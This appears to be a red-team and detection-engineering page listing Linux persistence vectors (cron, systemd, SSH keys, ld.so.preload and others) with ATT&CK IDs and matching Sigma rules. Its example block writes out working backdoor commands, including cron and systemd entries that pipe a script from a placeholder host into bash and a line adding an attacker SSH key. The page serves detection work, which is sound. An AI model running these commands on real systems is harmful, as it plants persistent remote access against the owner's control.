# GTFOBins - Linux Persistence Primitives

| Field | Value |
|---|---|
| `evasion_ids` | EV-LNX-0016 |
| `attack_ids` | T1053.003, T1098.004, T1547.001 |
| `detections` | `06-defense/sigma/ssa_linux_cron_persistence.yml`, `06-defense/sigma/ssa_linux_authorized_keys.yml` |

## 1. Persistence surface

| Vector | Artifact | Detection |
|---|---|---|
| Cron / anacron | `/etc/cron.*`, user crontab | `ssa_linux_cron_persistence.yml` |
| systemd | `/etc/systemd/system/*.service`, `~/.config/systemd/user` | `ssa_linux_systemd_persistence.yml` |
| SSH keys | `~/.ssh/authorized_keys`, `~/.ssh/config` | `ssa_linux_authorized_keys.yml` |
| Shell profile | `.bashrc`, `.profile`, `.zshrc` | `ssa_linux_profile_write.yml` |
| Dynamic loader | `/etc/ld.so.preload` | `ssa_linux_ld_preload.yml` |
| PAM | `/etc/pam.d/*` | file integrity monitoring |
| Kernel modules | `/etc/modules-load.d/` | FIM + module load audit |
| Bash function | `BASH_ENV` / exported function | env dump on execve |
| at / batch | `/var/spool/at/` | `ssa_linux_at_persistence.yml` |
| Container | image layer, `~/.docker/config.json` | `ssa_docker_privileged_run.yml` |

## 2. Examples (authorised testing only)

```bash
# cron (EV-LNX-0016)
(crontab -l 2>/dev/null; echo "* * * * * curl -s http://COLLAB/x.sh | bash") | crontab -

# systemd unit
printf '[Unit]\nDescription=x\n[Service]\nExecStart=/bin/bash -c "curl -s http://COLLAB/x|bash"\n' \
  | sudo tee /etc/systemd/system/x.service >/dev/null
sudo systemctl daemon-reload && sudo systemctl start x

# ld.so.preload
echo '/tmp/.x.so' | sudo tee -a /etc/ld.so.preload

# authorized_keys
echo 'ssh-rsa AAAA... attacker@lab' >> ~/.ssh/authorized_keys
```

## 3. Detection engineering note

Each vector gets exactly one Sigma rule and, where the data source supports it,
one Wazuh rule. The mapping is enforced by
`10-crosswalk/evasion-detection/evasion-to-detection.csv` - a persistence vector
with a Sigma rule but no Wazuh rule must declare `host_rule` as `n/a` with a
reason in the evasion index.
